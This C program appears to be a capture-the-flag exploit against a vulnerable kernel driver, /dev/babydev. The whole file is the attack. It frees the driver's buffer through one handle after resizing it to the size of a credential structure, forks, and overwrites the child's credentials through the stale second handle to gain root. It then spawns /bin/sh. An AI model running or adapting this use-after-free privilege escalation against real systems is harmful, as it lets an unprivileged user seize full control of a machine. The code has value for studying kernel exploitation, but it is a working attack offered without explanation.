#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

int main(){
	int f1 = open("/dev/babydev", 2);
	int f2 = open("/dev/babydev", 2);
	
	ioctl(f1, 0x10001, 0xa8);
	close(f1);
	
	int pid = fork();
	if(pid == 0){
		char buf[28] = {0};
		write(f2, buf, 28);
		printf("\033[34m\033[1m[*] The uid now is: %d.\033[0m\n", getuid());
		system("/bin/sh");
	}else if(pid < 0){
		printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\033[0m\n");
	}else{
		wait(NULL);
	}
	return 0;
}
